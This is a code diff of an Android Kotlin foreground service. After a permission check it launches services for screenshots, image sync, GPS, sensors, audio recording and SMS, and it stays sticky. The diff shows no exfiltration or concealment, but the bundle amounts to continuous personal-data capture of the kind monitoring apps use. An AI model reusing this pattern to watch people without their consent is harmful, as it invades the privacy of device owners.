@@ -5,8 +5,10 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 
 class ForegroundService : Service() {
 
@@ -24,18 +26,18 @@ class ForegroundService : Service() {
             .setPriority(NotificationCompat.PRIORITY_HIGH)
             .build()
         startForeground(1, notification)
-
-//        notifyService.startService()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         // Start and manage the sensor, GPS, audio, and screenshot services
-        startService(Intent(this, ScreenshotService::class.java)) // started in mainactivity because dependes on permissions
-        startService(Intent(this, GpsService::class.java))
-        startService(Intent(this, SensorService::class.java))
-        startService(Intent(this, AudioService::class.java))
-        startService(Intent(this, SMSService::class.java))
-
+        if (hasPermissions()) {
+            startService(Intent(this, ImageSyncService::class.java))
+            startService(Intent(this, AutoScreenshotService::class.java))
+            startService(Intent(this, GpsService::class.java))
+            startService(Intent(this, SensorService::class.java))
+            startService(Intent(this, AudioService::class.java))
+            startService(Intent(this, SMSService::class.java))
+        }
 
         return START_STICKY
     }
@@ -52,5 +54,18 @@ class ForegroundService : Service() {
         )
         val manager = getSystemService(NotificationManager::class.java)
         manager.createNotificationChannel(serviceChannel)
+    }
+
+    private fun hasPermissions(): Boolean {
+        val permissions = arrayOf(
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.CAMERA,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE
+        )
+        return permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        }
     }
 }
